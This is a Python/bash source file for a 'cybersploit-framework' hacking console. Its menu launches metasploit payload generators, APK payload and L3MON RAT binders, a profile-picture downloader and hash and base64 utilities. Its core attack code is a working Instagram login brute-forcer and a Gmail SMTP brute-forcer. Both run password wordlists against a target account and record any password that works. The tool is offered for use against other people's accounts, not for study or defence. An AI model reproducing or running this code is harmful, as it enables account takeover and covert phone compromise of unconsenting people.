#!/bin/python3
#<<<---------------IMPORT SECTION--------------->>>

from __future__ import absolute_import
from __future__ import print_function
import requests, sys, threading, os, random
from random import randint
from six.moves import input
import re
from datetime import datetime, date, time
from time import gmtime, strftime
import smtplib
import hashlib, base64
import instaloader
import subprocess
from os import system
import time
def __internet_():
	os.system('''
#!/bin/bash
while true; do
ping -c 1 google.com > /dev/null 2>&1
if [[ "$?" != 0 ]]
then
	echo
        printf "\n[\e[1;31m!\e[0m]\e[1;31m YOU ARE NOT CONNECTED TO INTERNET!!\e[0m\n"
        printf "\n\e[1;33mplease turn on your internet data to continue this process..\e[0m\n"
	printf "\n\e[1;36mpress \e[1;31mEnter\e[1;36m if you have connected or run \e[1;31mquit\e[1;36m to exit==> \e[0m"
        read internt
        	if [[ $internt == 'exit' || $internt == 'quit' ]]; then
                	printf "\e[4;97mCSF \e[0;0;0m> \e[1;32mExiting\e[0m"
                	printf "\e[1;32m..........\e[0m\n" | pv -qL 10
                	exit
		else
			:
        	fi
else
        printf "\n\e[1;32m connecting to server\e[0m"
        printf "\e[1;32m...........\e[0m\n" | pv -qL 10
	echo
break
fi
done
		''')

#<<<---------------UPDATE SECTION--------------->>>
args = sys.argv[-1 or 0 or 1]
if (args == '-u' or args == '--update'):
	__internet_()
	os.system('''
cd $HOME
distro=$(pwd)
if [[ $distro == /data/data/com.termux/files/home ]]; then
cd /data/data/com.termux/files/usr/share/cybersploit-framework
git pull
elif [[ $distro == /data/data/hilled.pwnterm/files/usr/home ]]; then
cd /data/data/hilled.pwnterm/files/usr/share/cybersploit-framework
git pull
else
cd /usr/share/cybersploit-framework
sudo git pull
fi
		''')
elif (args == '~u' or args == '~~update'):
	__inertnet_()
	os.system("cybersploit-u")
elif (args == '-v' or args == '--version'):
	print ("\n\033[4;2;36mCSF \033[1;37m> \033[1;32mVERSION = 2.0\033[0;0m\n")
elif (args == sys.argv[0]):
	def banner():
#<<<--------------DATE AND TIME SECTION--------------->>>
		date_ = date.today()
		time_ = strftime("%I:%M:%S")
#<<<---------------INTRO SECTION--------------->>>

		print ("\033[1;33m		    _                         _       _ _")
		print ("\033[1;33m	  ___ _   _| |__   ___ _ __ ___ _ __ | | ___ (_) |_")
		print ("\033[1;33m	 / __| | | | '_ \ / _ \ '__/ __| '_ \| |/ _ \| | __|")
		print ("\033[1;33m	| (__| |_| | |_) |  __/ |  \__ \ |_) | | (_) | | |_")
		print ("\033[1;33m	 \___|\__, |_.__/ \___|_|  |___/ .__/|_|\___/|_|\__|")
		print ("\033[1;33m	      |___/                    |_|")
		print ("\033[1;33m	        ___ ___  _ __  ___  ___ | | ___")
		print ("\033[1;33m	       / __/ _ \| '_ \/ __|/ _ \| |/ _ \\")
		print ("\033[1;33m	      | (_| (_) | | | \__ \ (_) | |  __/")
		print ("\033[1;33m	       \___\___/|_| |_|___/\___/|_|\___|")
		print ("\n")
		print ("CURRENT","~DATE =",(date_),"               ""~TIME =",(time_))
		print ("\033[1;31m<<<------------welcome to cybersploit-framework------------>>>")
		print ("\033[1;37m>>>A (PYTHON and BASH) PROGRAM Authoured by jk   !")
		print ("\n")
	banner()
#<<<---------------TOOL SECTION--------------->>>

	while True:
		name = input("\033[1;36mEnter your name ->> ")
		mystring = input("\033[1;36mEnter your password ——>> ")
		hash_object = hashlib.md5(mystring.encode())
		code = (hash_object.hexdigest())
		if (code == 'd7b3751da886d06345edb877026cb026'):
			print ("\n")
			print ("\033[1;33maccess granted :)")
			print ("\n")
			print ("\033[1;33mWelcome >>>",(name))
			print ("\n")
			print ("\033[1;31mRun 'help' to show all valid commands")
			print ("\n")
			while True:
#<<<---------------HELP SECTION--------------->>>

				def __help__():
					os.system('''
B0="$(printf '\033[100m')"
C6="$(printf '\033[96m')"
R0="$(printf '\033[00m')"
echo -e "
${B0}HELP MENUE${R0}
<====================================================================>
    Command                      Description
    -------                      -----------
   ${C6} quit or exit${R0} |->   Command to exit csfconsole!!
   ${C6} clear${R0}        |->   Command to clear screen.
   ${C6} help${R0}         |->   Command to show help meunu.
   ${C6} banner${R0}       |->   Command to show current banner
   ${C6} allprograms${R0}  |->   Command to show list of modules.
   ${C6} list${R0}         |->   Command to show list submodules.
   ${C6} back${R0}         |->   Command to get back to main menue.
   ${C6} report${R0}       |->   command to contact us on telegram.
"
						''')
				def __report__():
					os.system('''
xdg-open https://t.me/joinchat/0VDWtOuNT6lhYzM0
						''')
#<<<---------------PROGRAM LIST SECTION--------------->>>

				def __programs__():
					print ("\033[1;37m>>>select any of the following options")
					print ("\n")
					print ("\033[4;37m1:for metasploit payload generator\033[0;0m")
					print ("\033[4;37m2:for payload binder with apk file\033[0;0m")
					print ("\033[4;37m3:for L3MON RAT binder with apk file\033[0;0m")
					print ("\033[4;37m4:for insta brute force :\033[0;0m")
					print ("\033[4;37m5:for insta profile pic downloader :\033[0;0m")
					print ("\033[4;37m6:for gmail brute force :\033[0;0m")
					print ("\033[4;37m7:for text to hash converter\033[0;0m")
					print ("\033[4;37m8:for base64/base32 to text decoder\033[0;0m")
					print ("\033[2;37mRun 'quit' to exit the program\033[0;0m")
					print ("\033[2;37mRun 'cmd' to run system commands\033[0;0m")
					print ("\n")

				option = input("\033[4;2;37mCSF\033[0;0;0m > \033[0m")
#code for payload generator and exploiter :)

				if (option == '1'):
					print ("\033[1;36m<<<--------welcome to metasploit payload generator-------->>>")
					print ("\n")
					print ("\033[1;33m ____     __   ___  ___        ____")
					print ("\033[1;33m|  _ \ __ \ \ / / |/ _ \  __ _|  _ \\")
					print ("\033[1;33m| |_) / _` \ V /| | | | |/ _` | | | |")
					print ("\033[1;33m|  __/ (_| || | | | |_| | (_| | |_| |")
					print ("\033[1;33m|_|   \__,_||_| |_|\___/ \__,_|____/  \033[1;31mGENERATOR!!\n")
					print ("\n")
					print ("\033[1;31mNOTE:- you must have installed metasploit otherwise it will show error!!")
					time.sleep (2)
					print ("\n")
					chek = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;37m>>Run 'y' if you have metasploit installed,  '1' to go back and anything to exit else >>> ")

					if (chek == 'y'):
						os.system('.paygen')
						print ("\n")
					elif (chek == '1'):
						print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;36mrestarting the program")
						print ("\n")
						time.sleep (1)
					else:
						print ("\n")
						print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;37msince you don't have installed metasploit it can\' run")
						print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;32mEXITING......!")
						time.sleep (0.4)
						print ("\n")
						exit()
#code for payload binder and exploitrr :)

				elif (option == '2'):
					print ("\033[1;36m<<<--------welcome to payload binder with apk file-------->>>")
					print ("\n")
					print ("\033[1;33m ____     __   ___  ___        ____")
					print ("\033[1;33m|  _ \ __ \ \ / / |/ _ \  __ _|  _ \\")
					print ("\033[1;33m| |_) / _` \ V /| | | | |/ _` | | | |")
					print ("\033[1;33m|  __/ (_| || | | | |_| | (_| | |_| |")
					print ("\033[1;33m|_|   \__,_||_| |_|\___/ \__,_|____/  \033[1;31mBINDER with apk file!!\n")
					print ("\n")
					print ("\033[1;31mNOTE:- you must have installed metasploit otherwise it will show error!!")
					time.sleep (2)
					print ("\n")
					chek = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;37m>>Run 'y' if you have metasploit installed,  '1' to go back and anything to exit else >>> ")

					if (chek == 'y'):
						os.system('.binderr')
						print ("\n")
					elif (chek == '1'):
						print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;36mrestarting the program")
						print ("\n")
						time.sleep (1)
					else:
						print ("\n")
						print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;37msince you don't have installed metasploit it cannot run")
						print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;32mEXITING......!")
						time.sleep (0.4)
						print ("\n")
						exit()

#code for L3MON binder and exploiter :)

				elif (option == '3'):
					time.sleep (0.4)
					print ("\033[1;37m    _     _____ __  __       _   _\033[0m")
					print ("\033[1;96m   | |   |___ /|  \/  | ___ | \ | |\033[0m")
					print ("\033[1;36m   | |     |_ \| |\/| |/ _ \|  \| |\033[0m")
					print ("\033[1;93m   | |___ ___) | |  | | (_) | |\  |\033[0m")
					print ("\033[1;33m   |_____|____/|_|  |_|\___/|_| \_|\033[1;37;45m binder \033[0;0;0m")
					print ("\033[1;36m<<<--------welcome to L3MON binder with apk file-------->>>")
					print ("\n")
					print ("\033[1;31mNOTE:- you must have installed lemon otherwise it will show error!!")
					time.sleep (2)
					print ("\n")
					lemco = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;37m>>Run 'y' if you have lemon installed,  '1' to go back and anything to exit else >>> ")

					if (lemco == 'y'):
						os.system('.lembinder')
						print ("\n")
					elif (lemco == '1'):
						print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;36mrestarting the program")
						print ("\n")
						time.sleep (1)
					else:
						print ("\n")
						print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;37msince you don't have lemon installed lemon it cannot run")
						print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;32mEXITING......!")
						time.sleep (0.4)
						print ("\n")
						exit()


				elif (option == '4'):
					time.sleep (0.4)
					print ("\033[1;32m<<<----------------------\033[1;31m!!cybersploit-framework!!\033[1;32m------------------>>>\033[0m")
	#code of instagram brute :)
					print ("\033[5;33m	 ___       ____  _      _         ____       __  __")
					print ("\033[5;33m	|_ _|_ __ / ___|| |_   / \   __ _|  _ \ __ _|  \/  |")
					print ("\033[5;33m	 | || '_ \\\___ \| __| / _ \ / _` | |_) / _` | |\/| |")
					print ("\033[5;33m	 | || | | |___) | |_ / ___ \ (_| |  _ < (_| | |  | |")
					print ("\033[5;33m	|___|_| |_|____/ \__/_/   \_\__, |_| \_\__,_|_|  |_|")
					print ("\033[5;33m				    |___/")
					print ("\033[1;35m<<<-----------------welcome to insta-brute force----------------->>>")
					print ("\n")
					CheckVersion = str (sys.version)

					class brute (object):
						def __init__(self):

							try:
								user = input("\033[4;2;37mCSF\033[0;0;0m > \033[0m(Enter target username)=> ")
								passlist = input ("\033[4;2;37mCSF\033[0;0;0m > \033[0m(Enter password <path/wordlist)=> ")
								print("\nTarget Username/Email Id: ",user)
								print("\nTrying Password list from:", passlist)

							except:
								print ('')
								sys.exit ()

							with open (passlist, 'r') as x:
								passlistlist = x.read ().splitlines ()
							thread = []
							self.Coutprox = 0
							for passlist in passlistlist:
								password = passlist.split (':')[0]
								t = threading.Thread (target=self.New_Br, args=(user, password))
								t.start ()
								thread.append (t)
								time.sleep (0.9)
								for j in thread:
									j.join ()

						def cls(self):
							linux = 'clear'
							windows = 'cls'
							os.system ([linux, windows][os.name == 'nt'])

						def New_Br(self, user, pwd):
							link = 'https://www.instagram.com/accounts/login/'
							login_url = 'https://www.instagram.com/accounts/login/ajax/'

							time = int (datetime.now ().timestamp ())

							payload = {
								'username': user,
								'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
								'queryParams': {},
								'optIntoOneTap': 'false'
							}

							with requests.Session () as s:
								r = s.get (link)
								r = s.post (login_url, data=payload, headers={
									"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
									"X-Requested-With": "XMLHttpRequest",
									"Referer": "https://www.instagram.com/accounts/login/",
									"x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
								})
								print (f'Username: {user}  Trying Password: {pwd}')

								if 'checkpoint_url' in r.text:
									print (('' + user + ':' + pwd + ' : yup! you got the password'))
									with open ('good.txt', 'a') as x:
										x.write (user + ':' + pwd + '\n')
								elif 'two_factor_required' in r.text:
									print (('' + user + ':' + pwd + ' : Two-factor authentication is required here!! '))
									with open ('target_report.txt', 'a') as x:
										x.write (user + ':' + pwd + '\n')


					brute()
					print ("\n")
					print ("\033[4;2;37mCSF\033[0;0;0m > \033[0mIf its successfull, check the password in 'target_report.txt' file")
					print ("\n")
					print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;34m:)Thankyou for using insta-brute force")
					read = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;36m>>choose '1' To open the program again and any other button to exit -->>")
					if (read == '1'):
						print ("\033[4;2;37mCSF\033[0;0;0m > \033[0mrestarting the program")
						print ("\n")
						print ("\n")
						print ("\n")
					else:
						exit()
#CODE FOR INSTA PIC DOWNLOADER:)

				elif (option == '5'):
					print ("\033[1;37m ___       ____  _      _         ____  _  ____ \033[0m")
					print ("\033[1;37m|_ _|_ __ / ___|| |_   / \       |  _ \(_)/ ___|\033[0m")
					print ("\033[1;36m | || '_ \\\___ \| __| / _ \ _____| |_) | | |    \033[0m")
					print ("\033[1;33m | || | | |___) | |_ / ___ \_____|  __/| | |___ \033[0m")
					print ("\033[1;33m|___|_| |_|____/ \__/_/   \_\    |_|   |_|\____|\033[1;37;45m downloader \033[0;0;0m")

					print ("\033[1;35m<<<-------welcome to insta profile pic downloader------->>>")
					print ("\n")
					time.sleep (2)

					ig = instaloader.Instaloader()

					dp = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;33m(Enter Insta username)=> ")
					print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;32mplease wait .....!")
					print ("\n")
					time.sleep(0.3)
					ig.download_profile(dp ,profile_pic_only=True)
					print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;36mDowmloading finished")
					print ("\n")
					print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;34mprofile pic is saved in your current directory, named as", (dp) )
					print ("\n")
					print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;31mAfter exiting the program run 'mv -v",(dp),"/sdcard' to move it in your visible device memory")
					print ("\n")

#code of gmail brute force attack :)

				elif (option == '6'):
					time.sleep (0.4)
					print ("\033[1;32m<<<---------------welcome to gmail brute force--------------->>>")
					print ("\033[1;36m   ##########################################################")
					print ("\033[1;36m   #\033[1;33m                                  \033[1;36m                      #")
					print ("\033[1;36m   #\033[1;33m                     \||/         \033[1;36m                      #")
					print ("\033[1;36m   #\033[1;33m                     |  \033[1;31m@\033[1;33m___oo    \033[1;36m                      #")
					print ("\033[1;36m   #\033[1;33m           /\  /\   / (__\033[1;37m,,,,\033[1;33m|    \033[1;36m                      #")
					print ("\033[1;36m   #\033[1;33m          ) /^\) ^\/ _)           \033[1;35m Gmail-hack!\033[1;36m          #")
					print ("\033[1;36m   #\033[1;33m          )   /^\/   _)           \033[1;31m   CoDeD By:\033[1;36m          #")
					print ("\033[1;36m   #\033[1;33m          )   _ /  / _)           \033[1;31m      jk    \033[1;36m          #")
					print ("\033[1;36m   #\033[1;33m      /\  )/\/ ||  | )_)          \033[1;36m                      #")
					print ("\033[1;36m   #\033[1;33m     <  >      |(,,) )__)         \033[1;36m                      #")
					print ("\033[1;36m   #\033[1;33m      ||      /    \)___)\        \033[1;36m                      #")
					print ("\033[1;36m   #\033[1;33m      | \____(      )___) )___    \033[1;36m                      #")
					print ("\033[1;36m   #\033[1;33m      \______(_______;;; __;;;    \033[1;36m                      #")
					print ("\033[1;36m   #\033[1;33m                                   \033[1;36m                     #")
					print ("\033[1;36m   ##########################################################")
					print ("\n")

					smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
					smtpserver.ehlo()
					smtpserver.starttls()

					user = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;37m(Enter The Target Gmail Address)=> ")
					print("\n")

					passswfile = input('\033[4;2;37mCSF\033[0;0;0m > \033[1;37m(Enter password <path/wordlist)==> ')

					passswfile = open(passswfile, "r")

					for password in passswfile:
						try:
							smtpserver.login(user, password)
							print("[!] Password Found = %s" % password)
							break

						except smtplib.SMTPAuthenticationError:
							print(":-( Password Is Wrong = %s " % password)
					print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;34m:)Thankyou for using gmal-brute force")
					read = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;36mchoose '1' To open the program again and any other button to exit-->")
					if (read == '1'):
						print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;32mrestarting the program")
						print ("\n")
						print ("\n")
						print ("\n")
					else:
						exit()
#CODE FOR TEXT TO HASH CONVERTER

				elif (option == '7'):

					def __banner__():
						print ("     \033[1;37m  ╭━━━━╮╱╱╱╱╭╮╱╱╭╮╱╱╱╱╭╮╱╱╱╱╱╱╱╭╮\033[0m")
						print ("     \033[1;37m  ┃╭╮╭╮┃╱╱╱╭╯╰╮╭╯╰╮╱╱╱┃┃╱╱╱╱╱╱╱┃┃\033[0m")
						print ("     \033[1;36m  ╰╯┃┃┣┻━┳╮┣╮╭╯╰╮╭╋━━╮┃╰━┳━━┳━━┫╰━╮\033[0m")
						print ("     \033[1;36m  ╱╱┃┃┃┃━╋╋╋┫┃╱╱┃┃┃╭╮┃┃╭╮┃╭╮┃━━┫╭╮┃\033[0m")
						print ("     \033[1;33m  ╱╱┃┃┃┃━╋╋╋┫╰╮╱┃╰┫╰╯┃┃┃┃┃╭╮┣━━┃┃┃┃\033[0m")
						print ("     \033[1;33m  ╱╱╰╯╰━━┻╯╰┻━╯╱╰━┻━━╯╰╯╰┻╯╰┻━━┻╯╰╯\033[1;32;45m ~ CONVERTER  \033[0;0;0m\n")
						print ("\033[1;35m<<<--------Welcome to Text to Hash converter-------->>>\n")
						print ("\n")
					__banner__()
					while True:
						def list():
							print ("\033[1;37mChoose from following options:-\n")
							print ("\033[4;37m1:Text to MD5 converter.\033[0;0m")
							print ("\033[4;37m2:Text to SHA1.\033[0;0m")
							print ("\033[4;37m3:TEXT to SHA224.\033[0;0m")
							print ("\033[4;37m4:Text to SHA256.\033[0;0m")
							print ("\033[4;37m5:Text to SHA384.\033[0;0m")
							print ("\033[4;37m6:Text to SHA512.\033[0;0m")
							print ("\033[4;37m7:TEXT to base64.\033[0;0m")
							print ("\033[4;37m8:Text to base32.\033[0;0m")
							print ("\033[2;37mRun 'quit' to exit the program\033[0;0m")
							print ("\033[2;37mRun 'back' to show program list\033[0;0m")
							print ("\n")
						optn = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;32m(TEXT to HASH)>>")
						print ("\n")
						if (optn == '1'):
							time.sleep (0.4)
							print ("\033[1;35m<<<---welcome to Text to MD5 converter--->>>")
							print ("\n")
							mystring = input('\033[4;2;37mCSF\033[0;0;0m > \033[1;31mEnter your text--> : ')
							hash_object = hashlib.md5(mystring.encode())
							print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;34mResult->",(hash_object.hexdigest()))
							print ("\n")
							time.sleep (0.4)
							read = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;36m>>choose '1' To open the program again and any other button to exit-->")
							if (read == '1'):
								print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;32mrestarting the program")
								print ("\n")
								print ("\n")
								time.sleep (1)
							else:
								exit()
						elif (optn == '2'):
							time.sleep (0.4)
							print ("\033[1;35m<<<---welcome to Text to SHA1 converter--->>>")
							print ("\n")
							mystring = input('\033[4;2;37mCSF\033[0;0;0m > \033[1;31mEnter your text--> ')
							hash_obj = hashlib.sha1(mystring.encode())
							print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;34mResult->",(hash_obj.hexdigest()))
							print ("\n")
							time.sleep (0.4)
							read = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;36m>>choose '1' To open the program again and any other button to exit-->")
							if (read == '1'):
								print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;32mrestarting the program")
								print ("\n")
								print ("\n")
								time.sleep (1)
							else:
								exit()
						elif (optn == '3'):
							time.sleep (0.4)
							print ("\033[1;35m<<<---welcome to Text to SHA224 converter--->>>")
							print ("\n")
							mystring = input('\033[4;2;37mCSF\033[0;0;0m > \033[1;31mEnter your text--> ')
							hash_obj = hashlib.sha224(mystring.encode())
							print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;34mResult->",(hash_obj.hexdigest()))
							print ("\n")
							time.sleep (0.4)
							read = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;36m>>choose '1' To open the program again and any other button to exit-->")
							if (read == '1'):
								print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;32mrestarting the program")
								print ("\n")
								print ("\n")
								time.sleep (1)
							else:
								exit()
						elif (optn == '4'):
							time.sleep (0.4)
							print ("\033[1;35m<<<---welcome to Text to SHA256 converter--->>>")
							print ("\n")
							mystring = input('\033[4;2;37mCSF\033[0;0;0m > \033[1;31mEnter your text--> ')
							hash_obj = hashlib.sha256(mystring.encode())
							print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;34mResult->",(hash_obj.hexdigest()))
							print ("\n")
							time.sleep (0.4)
							read = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;36m>>choose '1' To open the program again and any other button to exit-->")
							if (read == '1'):
								print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;32mrestarting the program")
								print ("\n")
								print ("\n")
								time.sleep (1)
							else:
								exit()
						elif (optn == '5'):
							time.sleep (0.4)
							print ("\033[1;35m<<<---welcome to Text to SHA384 converter--->>>")
							print ("\n")
							mystring = input('\033[4;2;37mCSF\033[0;0;0m > \033[1;31mEnter your text--> ')
							hash_obj = hashlib.sha384(mystring.encode())
							print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;34mResult->",(hash_obj.hexdigest()))
							print ("\n")
							time.sleep (0.4)
							read = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;36m>>choose '1' To open the program again and any other button to exit-->")
							if (read == '1'):
								print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;32mrestarting the program")
								print ("\n")
								print ("\n")
								time.sleep (1)
							else:
								exit()
						elif (optn == '6'):
							time.sleep (0.4)
							print ("\033[1;35m<<<---welcome to Text to SHA512 converter--->>>")
							print ("\n")
							mystring = input('\033[4;2;37mCSF\033[0;0;0m > \033[1;31mEnter your text--> ')
							hash_obj = hashlib.sha512(mystring.encode())
							print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;34mResult->",(hash_obj.hexdigest()))
							print ("\n")
							time.sleep (0.4)
							read = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;36m>>choose '1' To open the program again and any other button to exit-->")
							if (read == '1'):
								print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;32mrestarting the program")
								print ("\n")
								print ("\n")
								time.sleep (1)
							else:
								exit()
						elif (optn == '7'):
							time.sleep (0.4)
							print("\033[1;35m <<<--------welcome to text to  base64 convrter------>>>\033[0m\n")
							message =  input("\033[4;2;37mCSF\033[0;0;0m > \033[1;31mEnter your text---> \033[0m")
							message_bytes = message.encode('ascii')
							base64_bytes = base64.b64encode(message_bytes)
							base64_message = base64_bytes.decode('ascii')
							print("\033[4;2;37mCSF\033[0;0;0m > \033[1;34mResult---> ",(base64_message))
							print ("\n")
							time.sleep (0.4)
							read = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;36m>>choose '1' To open the program again and any other button to exit-->")

							if (read == '1'):
								print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;32mrestarting the program")
								print ("\n")
								print ("\n")
								time.sleep (1)
							else:
								exit()
						elif (optn =='8'):
							time.sleep (0.4)
							print("\033[1;35m <<<--------welcome to text to  base32 convrter------>>>\033[0m\n")
							message =  input("\033[4;2;37mCSF\033[0;0;0m > \033[1;31mEnter your text---> \033[0m")
							message_bytes = message.encode('ascii')
							base32_bytes = base64.b32encode(message_bytes)
							base32_message = base32_bytes.decode('ascii')
							print("\033[4;2;37mCSF\033[0;0;0m > \033[1;34mResult---> ",(base32_message))
							print ("\n")
							time.sleep (0.4)
							read = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;36m>>choose '1' To open the program again and any other button to exit-->")

							if (read == '1'):
								print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;32mrestarting the program")
								print ("\n")
								print ("\n")
								time.sleep (1)
							else:
								exit()


						elif (optn == 'list'):
							list()
						elif (optn == 'allprograms'):
							print ("(•) \033[2;36mInvalid command!! use 'list' command to show submodules :)")
						elif (optn == 'quit') or (optn == 'exit'):
							print ("EXITING.......!")
							exit()

						elif (optn == 'back'):
							break

						elif (optn == 'banner'):
							__banner__()
						elif (optn == 'help'):
							__help__()
						elif (optn == 'clear'):
							os.system('''
								clear
								''')
						elif (optn == 'report'):
							__report__()

						else:
							print ("\n")
							print ("(•) Try again with valid option")

#coding for base64/base32 to text converter


				elif (option == '8'):
					def _bannerdpt_():
						print ("\033[1;37m ____        ____    __   __   _____     ____    \033[0m")
						print ("\033[1;37m|  _ \  ___ / ___|_ _\ \ / / _|_   _|__ |  _ \\  \033[0m")
						print ("\033[1;36m| | | |/ _ \ |   | '__\ V / '_ \| |/ _ \| |_) |  \033[0m")
						print ("\033[1;36m| |_| |  __/ |___| |   | || |_) | | (_) |  _ <   \033[0m")
						print ("\033[1;33m|____/ \___|\____|_|   |_|| .__/|_|\___/|_| \_\\ \033[0m")
						print ("\033[1;33m                          |_|\033[1;32;45m FOR base64 AND base32 \033[0m")
						print ("\033[1;35m<<<-------welcome to base64/base32 decrypter------->>>\n")
						print ("\n")
					_bannerdpt_()
					while True:
						def _listdpt_():
							print ("\033[1;37mChoose from following options:-\n")
							print ("\033[4;37m1:base64 to text converter.\033[0;0m")
							print ("\033[4;37m2:base32 to text converter.\033[0;0m")
							print ("\033[2;37mRun 'quit' to exit the program\033[0;0m")
							print ("\033[2;37mRun 'back' to show program list\033[0;0m")
							print ("\n")
						jk = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;32mEnter your option ---> ")
						print ("\n")
						if (jk == '1'):
							print ("     \033[1;37m  ╭╭━━╮╱╱╱╱╱╱╱╱╱╭━━━┳╮╱╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╭╮\033[0m")
							print ("     \033[1;37m  ╭┃╭╮┃╱╱╱╱╱╱╱╱╱┃╭━━┫┃╱┃┃╭╯╰╮╱╱╱╭╯╰╮╱╱╱╱╭╯╰╮\033[0m")
							print ("     \033[1;36m  ╭┃╰╯╰┳━━┳━━┳━━┫╰━━┫╰━╯┃╰╮╭╋━━╮╰╮╭╋━━┳╮┣╮╭╯\033[0m")
							print ("     \033[1;36m  ╭┃╭━╮┃╭╮┃━━┫┃━┫╭━╮┣━━╮┃╱┃┃┃╭╮┃╱┃┃┃┃━╋╋╋┫┃\033[0m")
							print ("     \033[1;33m  ╭┃╰━╯┃╭╮┣━━┃┃━┫╰━╯┃╱╱┃┃╱┃╰┫╰╯┃╱┃╰┫┃━╋╋╋┫╰╮\033[0m")
							print ("     \033[1;33m  ╭╰━━━┻╯╰┻━━┻━━┻━━━╯╱╱╰╯╱╰━┻━━╯╱╰━┻━━┻╯╰┻━╯\033[1;32;45m ~ converter  \033[0;0;0m\n")
							print ("\033[1;35m<<<--------welcome to base64 to text converter------->>> \033[om")
							print ("\n")
							base64_message = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;31mEnter your base64---> ")
							base64_bytes = base64_message.encode('ascii')
							message_bytes = base64.b64decode(base64_bytes)
							message = message_bytes.decode('ascii')
							print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;34mResult -->",(message))
							print ("\n")
							time.sleep (0.4)
							read = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;36m>>choose '1' To open the program again and any other button to exit-->")

							if (read == '1'):
								print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;32mrestarting the program")
								print ("\n")
								print ("\n")
								time.sleep (1)
							else:
								exit()
						elif (jk == '2'):
							print ("     \033[1;37m  ╭╭━━╮╱╱╱╱╱╱╱╱╱╭━━━┳━━━╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╭╮\033[0m")
							print ("     \033[1;37m  ╭┃╭╮┃╱╱╱╱╱╱╱╱╱┃╭━╮┃╭━╮┃╭╯╰╮╱╱╱╭╯╰╮╱╱╱╱╭╯╰╮\033[0m")
							print ("     \033[1;36m  ╭┃╰╯╰┳━━┳━━┳━━╋╯╭╯┣╯╭╯┃╰╮╭╋━━╮╰╮╭╋━━┳╮┣╮╭╯\033[0m")
							print ("     \033[1;36m  ╭┃╭━╮┃╭╮┃━━┫┃━╋╮╰╮┣━╯╭╯╱┃┃┃╭╮┃╱┃┃┃┃━╋╋╋┫┃\033[0m")
							print ("     \033[1;33m  ╭┃╰━╯┃╭╮┣━━┃┃━┫╰━╯┃┃╰━╮╱┃╰┫╰╯┃╱┃╰┫┃━╋╋╋┫╰╮\033[0m")
							print ("     \033[1;33m  ╭╰━━━┻╯╰┻━━┻━━┻━━━┻━━━╯╱╰━┻━━╯╱╰━┻━━┻╯╰┻━╯\033[1;32;45m ~ converter  \033[0;0;0m\n")
							print ("\033[1;35m<<<--------welcome to base32 to text converter------->>> \033[om")
							print ("\n")
							base32_message = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;31mEnter your base32---> ")
							base32_bytes = base32_message.encode('ascii')
							message_bytes = base64.b32decode(base32_bytes)
							message = message_bytes.decode('ascii')
							print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;34mResult -->",(message))
							print ("\n")
							time.sleep (0.4)
							read = input("\033[4;2;37mCSF\033[0;0;0m > \033[1;36m>>choose '1' To open the program again and any other button to exit-->")

							if (read == '1'):
								print ("\033[4;2;37mCSF\033[0;0;0m > \033[1;32mrestarting the program")
								print ("\n")
								print ("\n")
								time.sleep (1)
							else:
								exit()
						elif (jk == 'quit') or (jk == 'exit'):
							print ("EXITING.......!")
							exit()

						elif (jk == 'back'):
							break
						elif (jk == 'list'):
							_listdpt_()
						elif (jk == 'allprograms'):
							print ("(•) \033[2;36mInvalid command!! use 'list' command to show submodules")
						elif (jk == 'report'):
							__report__()
						elif (jk == 'clear'):
							os.system('''
								clear
								''')
						elif (jk == 'banner'):
							_bannerdpt_()
						else:
							print ("\n")
